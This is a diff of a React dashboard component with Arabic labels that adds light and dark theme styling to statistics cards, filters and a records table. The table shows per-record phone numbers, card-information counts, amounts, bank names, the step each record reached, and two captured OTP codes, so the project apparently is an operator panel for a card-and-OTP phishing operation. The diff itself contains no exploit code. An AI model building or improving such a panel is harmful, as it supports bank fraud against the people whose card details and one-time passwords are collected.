@@ -44,22 +44,22 @@ const BANK_NAMES = {
 
 // ─── Sub-components ───────────────────────────────────────────────────────────
 
-function StatisticsCard({ title, value, change, changeType, icon: Icon, color, accent }) {
+function StatisticsCard({ title, value, change, changeType, icon: Icon, color, accent, dark }) {
   return (
-    <div className={`relative overflow-hidden rounded-2xl border border-white/10 bg-slate-900/80 backdrop-blur-sm shadow-2xl shadow-black/30 p-6 group hover:border-white/20 transition-all duration-300`}>
-      <div className={`absolute inset-0 bg-gradient-to-br ${accent} opacity-10 group-hover:opacity-20 transition-opacity duration-300 rounded-2xl`} />
+    <div className={`relative overflow-hidden rounded-2xl border p-6 group transition-all duration-300 ${dark ? "border-white/10 bg-slate-900/80 backdrop-blur-sm shadow-2xl shadow-black/30 hover:border-white/20" : "border-slate-200 bg-white shadow-md hover:shadow-lg hover:border-slate-300"}`}>
+      <div className={`absolute inset-0 bg-gradient-to-br ${accent} opacity-10 group-hover:opacity-15 transition-opacity duration-300 rounded-2xl`} />
       <div className="relative flex items-start justify-between">
-        <div className={`p-3 rounded-xl ${color} shadow-lg shadow-black/30`}>
+        <div className={`p-3 rounded-xl ${color} shadow-lg`}>
           <Icon className="h-6 w-6 text-white" />
         </div>
         <div className="text-right">
-          <p className="text-xs uppercase tracking-widest text-slate-500 mb-1">{title}</p>
-          <p className="text-4xl font-black text-white tabular-nums">{value}</p>
+          <p className={`text-xs uppercase tracking-widest mb-1 ${dark ? "text-slate-500" : "text-slate-400"}`}>{title}</p>
+          <p className={`text-4xl font-black tabular-nums ${dark ? "text-white" : "text-slate-800"}`}>{value}</p>
         </div>
       </div>
       {change && (
         <div className="relative mt-4 flex items-center gap-1.5">
-          <span className={`inline-flex items-center gap-1 text-xs font-semibold px-2 py-0.5 rounded-full ${changeType === "increase" ? "bg-emerald-500/20 text-emerald-300" : "bg-slate-700/50 text-slate-400"}`}>
+          <span className={`inline-flex items-center gap-1 text-xs font-semibold px-2 py-0.5 rounded-full ${changeType === "increase" ? (dark ? "bg-emerald-500/20 text-emerald-300" : "bg-emerald-100 text-emerald-700") : (dark ? "bg-slate-700/50 text-slate-400" : "bg-slate-100 text-slate-500")}`}>
             <TrendingUp className="h-3 w-3" />{change}
           </span>
         </div>
@@ -521,10 +521,10 @@ export default function Dashboard() {
         {/* Statistics */}
         {showStats && (
           <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
-            <StatisticsCard title="إجمالي السجلات" value={records.length} change="+12%" changeType="increase" icon={Users} color="bg-gradient-to-br from-blue-500 to-indigo-600" accent="from-blue-500 to-indigo-600" />
-            <StatisticsCard title="معلومات البطاقات" value={cardCount} change="+8%" changeType="increase" icon={CreditCard} color="bg-gradient-to-br from-violet-500 to-purple-600" accent="from-violet-500 to-purple-600" />
-            <StatisticsCard title="الموافقات" value={approvedCount} change="+15%" changeType="increase" icon={CheckCircle} color="bg-gradient-to-br from-emerald-500 to-teal-600" accent="from-emerald-500 to-teal-600" />
-            <StatisticsCard title="المعلقة" value={pendingCount} change="" changeType="neutral" icon={Clock} color="bg-gradient-to-br from-amber-500 to-orange-600" accent="from-amber-500 to-orange-600" />
+            <StatisticsCard title="إجمالي السجلات" value={records.length} change="+12%" changeType="increase" icon={Users} color="bg-gradient-to-br from-blue-500 to-indigo-600" accent="from-blue-500 to-indigo-600" dark={d} />
+            <StatisticsCard title="معلومات البطاقات" value={cardCount} change="+8%" changeType="increase" icon={CreditCard} color="bg-gradient-to-br from-violet-500 to-purple-600" accent="from-violet-500 to-purple-600" dark={d} />
+            <StatisticsCard title="الموافقات" value={approvedCount} change="+15%" changeType="increase" icon={CheckCircle} color="bg-gradient-to-br from-emerald-500 to-teal-600" accent="from-emerald-500 to-teal-600" dark={d} />
+            <StatisticsCard title="المعلقة" value={pendingCount} change="" changeType="neutral" icon={Clock} color="bg-gradient-to-br from-amber-500 to-orange-600" accent="from-amber-500 to-orange-600" dark={d} />
           </div>
         )}
 
@@ -533,7 +533,7 @@ export default function Dashboard() {
           <div className="flex flex-col lg:flex-row gap-4 items-start lg:items-center justify-between">
             <div className="flex flex-col sm:flex-row gap-3 w-full lg:w-auto">
               <Tabs value={filterType} onValueChange={setFilterType} className="w-full sm:w-auto">
-                <TabsList className="grid grid-cols-4 bg-slate-950/60 border border-white/5 rounded-xl p-1">
+               <TabsList className={`grid grid-cols-4 rounded-xl p-1 ${d ? "bg-slate-950/60 border border-white/5" : "bg-slate-100 border border-slate-200"}`}>
                   <TabsTrigger value="all" className="flex items-center gap-1 text-slate-500 rounded-lg data-[state=active]:bg-emerald-600 data-[state=active]:text-white data-[state=active]:shadow-lg"><Filter className="h-3 w-3" />الكل</TabsTrigger>
                   <TabsTrigger value="pending" className="flex items-center gap-1 text-slate-500 rounded-lg data-[state=active]:bg-amber-600 data-[state=active]:text-white data-[state=active]:shadow-lg"><Clock className="h-3 w-3" />معلق</TabsTrigger>
                   <TabsTrigger value="card" className="flex items-center gap-1 text-slate-500 rounded-lg data-[state=active]:bg-violet-600 data-[state=active]:text-white data-[state=active]:shadow-lg"><CreditCard className="h-3 w-3" />بطاقات</TabsTrigger>
@@ -541,7 +541,7 @@ export default function Dashboard() {
                 </TabsList>
               </Tabs>
               <Select value={sortBy} onValueChange={setSortBy}>
-                <SelectTrigger className="w-full sm:w-[160px] bg-slate-950/60 border-white/5 text-slate-300 rounded-xl">
+                <SelectTrigger className={`w-full sm:w-[160px] rounded-xl ${d ? "bg-slate-950/60 border-white/5 text-slate-300" : "bg-white border-slate-200 text-slate-700"}`}>
                   <ArrowUpDown className="h-3.5 w-3.5 ml-2 text-emerald-400" />
                   <SelectValue placeholder="ترتيب حسب" />
                 </SelectTrigger>
@@ -557,7 +557,7 @@ export default function Dashboard() {
               <Input
                 type="search"
                 placeholder="البحث في السجلات..."
-                className="pl-10 pr-10 bg-slate-950/60 border-white/5 text-white placeholder:text-slate-600 focus:border-emerald-500/40 rounded-xl transition-colors duration-200"
+                className={`pl-10 pr-10 rounded-xl transition-colors duration-200 ${d ? "bg-slate-950/60 border-white/5 text-white placeholder:text-slate-600 focus:border-emerald-500/40" : "bg-white border-slate-200 text-slate-800 placeholder:text-slate-400 focus:border-emerald-400"}`}
                 value={searchTerm}
                 onChange={e => setSearchTerm(e.target.value)}
               />
@@ -572,15 +572,15 @@ export default function Dashboard() {
 
         {/* Table */}
         <Card className={`rounded-2xl border backdrop-blur-sm overflow-hidden transition-colors duration-300 ${d ? "border-white/5 bg-slate-900/60 shadow-2xl shadow-black/30" : "border-slate-200 bg-white shadow-lg"}`}>
-          <CardHeader className="pb-4 border-b border-white/5">
+          <CardHeader className={`pb-4 border-b transition-colors duration-300 ${d ? "border-white/5" : "border-slate-100"}`}>
             <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
               <div className="flex items-center gap-3">
                 <div className="w-1 h-7 rounded-full bg-gradient-to-b from-emerald-400 to-teal-500" />
                 <div>
-                  <CardTitle className="text-lg font-bold flex items-center gap-2 text-white tracking-tight">
-                    <Activity className="h-5 w-5 text-emerald-400" /> إدارة السجلات
+                  <CardTitle className={`text-lg font-bold flex items-center gap-2 tracking-tight ${d ? "text-white" : "text-slate-800"}`}>
+                    <Activity className="h-5 w-5 text-emerald-500" /> إدارة السجلات
                   </CardTitle>
-                  <CardDescription className="text-xs text-slate-500 mt-0.5">
+                  <CardDescription className={`text-xs mt-0.5 ${d ? "text-slate-500" : "text-slate-400"}`}>
                     {filtered.length} سجل
                   </CardDescription>
                 </div>
@@ -603,19 +603,19 @@ export default function Dashboard() {
               <div className="overflow-x-auto">
                 <table className="w-full table-auto border-collapse">
                   <thead>
-                    <tr className="border-b border-white/5">
-                      {[
-                        { label: "الهاتف", key: null },
-                        { label: "البيانات", key: null },
-                        { label: "المبلغ", key: "amount" },
-                        { label: "البنك", key: null },
-                        { label: "الحالة", key: "status" },
-                        { label: "الخطوة", key: null },
-                        { label: "OTP", key: null },
-                        { label: "الوقت", key: "date" },
-                        { label: "الإجراءات", key: null },
-                      ].map(({ label, key }) => (
-                        <th key={label} className={`px-6 py-3.5 text-right font-semibold text-slate-500 text-xs uppercase tracking-wider ${key ? "cursor-pointer hover:text-slate-300 transition-colors duration-150" : ""}`} onClick={key ? () => toggleSort(key) : undefined}>
+                    <tr className={`border-b transition-colors duration-300 ${d ? "border-white/5" : "border-slate-100"}`}>
+                     {[
+                       { label: "الهاتف", key: null },
+                       { label: "البيانات", key: null },
+                       { label: "المبلغ", key: "amount" },
+                       { label: "البنك", key: null },
+                       { label: "الحالة", key: "status" },
+                       { label: "الخطوة", key: null },
+                       { label: "OTP", key: null },
+                       { label: "الوقت", key: "date" },
+                       { label: "الإجراءات", key: null },
+                     ].map(({ label, key }) => (
+                       <th key={label} className={`px-6 py-3.5 text-right font-semibold text-xs uppercase tracking-wider ${key ? "cursor-pointer transition-colors duration-150" : ""} ${d ? "text-slate-500 hover:text-slate-300" : "text-slate-400 hover:text-slate-700 bg-slate-50"}`} onClick={key ? () => toggleSort(key) : undefined}>
                           <div className="flex items-center gap-1 justify-end">
                             {label}
                             {key && sortBy === key && <ArrowUpDown className="h-3 w-3 text-emerald-400" />}
@@ -653,30 +653,30 @@ export default function Dashboard() {
                              </div>
                            </td>
                            <td className="px-5 py-3.5">
-                             {r.amount
-                               ? <span className="inline-flex items-center font-mono text-sm font-bold text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 rounded-lg px-3 py-1">{r.amount}</span>
-                               : <span className="text-slate-600">—</span>}
-                           </td>
-                           <td className="px-5 py-3.5">
-                             {r.bank
-                               ? <span className="text-sm font-semibold text-slate-200">{r.bank}</span>
-                               : <span className="text-slate-600">—</span>}
-                           </td>
+                              {r.amount
+                                ? <span className={`inline-flex items-center font-mono text-sm font-bold rounded-lg px-3 py-1 ${d ? "text-emerald-400 bg-emerald-500/10 border border-emerald-500/20" : "text-emerald-700 bg-emerald-50 border border-emerald-200"}`}>{r.amount}</span>
+                                : <span className={d ? "text-slate-600" : "text-slate-300"}>—</span>}
+                            </td>
+                            <td className="px-5 py-3.5">
+                              {r.bank
+                                ? <span className={`text-sm font-semibold ${d ? "text-slate-200" : "text-slate-700"}`}>{r.bank}</span>
+                                : <span className={d ? "text-slate-600" : "text-slate-300"}>—</span>}
+                            </td>
                            <td className="px-5 py-3.5"><StatusBadge status={statusLabel} /></td>
                            <td className="px-5 py-3.5 text-center">
                              {r.step_reached != null
-                               ? <span className="inline-flex items-center justify-center w-8 h-8 rounded-full bg-violet-500/15 border border-violet-500/25 text-violet-300 text-sm font-bold">{r.step_reached}</span>
-                               : <span className="text-slate-600">—</span>}
+                               ? <span className={`inline-flex items-center justify-center w-8 h-8 rounded-full text-sm font-bold ${d ? "bg-violet-500/15 border border-violet-500/25 text-violet-300" : "bg-violet-100 border border-violet-200 text-violet-700"}`}>{r.step_reached}</span>
+                               : <span className={d ? "text-slate-600" : "text-slate-300"}>—</span>}
                            </td>
                            <td className="px-5 py-3.5">
                              <div className="flex flex-col gap-1.5">
-                               {r.otp1 ? <span className="font-mono text-xs text-amber-300 bg-amber-500/10 border border-amber-500/20 rounded-lg px-2.5 py-1 whitespace-nowrap">① {r.otp1}</span> : null}
-                               {r.otp2 ? <span className="font-mono text-xs text-cyan-300 bg-cyan-500/10 border border-cyan-500/20 rounded-lg px-2.5 py-1 whitespace-nowrap">② {r.otp2}</span> : null}
-                               {!r.otp1 && !r.otp2 && <span className="text-slate-600">—</span>}
+                               {r.otp1 ? <span className={`font-mono text-xs rounded-lg px-2.5 py-1 whitespace-nowrap ${d ? "text-amber-300 bg-amber-500/10 border border-amber-500/20" : "text-amber-700 bg-amber-50 border border-amber-200"}`}>① {r.otp1}</span> : null}
+                               {r.otp2 ? <span className={`font-mono text-xs rounded-lg px-2.5 py-1 whitespace-nowrap ${d ? "text-cyan-300 bg-cyan-500/10 border border-cyan-500/20" : "text-cyan-700 bg-cyan-50 border border-cyan-200"}`}>② {r.otp2}</span> : null}
+                               {!r.otp1 && !r.otp2 && <span className={d ? "text-slate-600" : "text-slate-300"}>—</span>}
                              </div>
                            </td>
                            <td className="px-5 py-3.5">
-                             <span className="text-xs text-slate-500 whitespace-nowrap">{r.created_date ? formatDistanceToNow(new Date(r.created_date), { addSuffix: true, locale: ar }) : "—"}</span>
+                             <span className={`text-xs whitespace-nowrap ${d ? "text-slate-500" : "text-slate-400"}`}>{r.created_date ? formatDistanceToNow(new Date(r.created_date), { addSuffix: true, locale: ar }) : "—"}</span>
                            </td>
                            <td className="px-5 py-3.5">
                              <div className="flex items-center gap-1">
@@ -701,7 +701,7 @@ export default function Dashboard() {
             )}
           </CardContent>
           {paginated.length > 0 && (
-           <CardFooter className="border-t border-white/5 p-4">
+           <CardFooter className={`border-t p-4 transition-colors duration-300 ${d ? "border-white/5" : "border-slate-100"}`}>
              <PaginationBar currentPage={currentPage} totalPages={totalPages} onPageChange={setCurrentPage} totalItems={filtered.length} itemsPerPage={itemsPerPage} />
            </CardFooter>
           )}
